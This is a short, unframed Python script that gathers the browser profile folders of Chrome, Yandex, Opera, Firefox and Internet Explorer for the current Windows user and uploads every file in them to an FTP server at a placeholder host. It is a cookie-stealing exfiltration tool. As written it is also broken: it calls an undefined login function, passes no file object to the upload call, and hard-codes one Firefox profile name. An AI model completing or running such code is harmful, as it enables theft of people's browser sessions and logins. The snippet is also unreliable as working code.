from ftplib import FTP
import getpass
import os

ftp_server = FTP('ftp.test')
ftp_login()
username = getpass.getuser()

paths = []

chrome_cookie_path = 'C:\\Users\\' + username + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\'
yandex_cookie_path = 'C:\\Users\\' + username + '\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\'
opera_cookie_path = 'C:\\Users\\' + username + '\\AppData\\Roaming\\Opera Software\\Opera Stable\\'
mozilla_cookie_path = 'C:\\Users\\' + username + '\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\qx1fqa6b.Default User\\'
internet_explorer_cookie_path = 'C:\\Users\\' + username + '\\AppData\\Local\\Microsoft\\Windows\\INetCookies\\'

paths = [chrome_cookie_path, yandex_cookie_path, opera_cookie_path, mozilla_cookie_path, internet_explorer_cookie_path]

for path in paths:
    if os.path.exists(path):
        for file in os.listdir(path):
            ftp_server.storbinary('STOR ' + file)
       
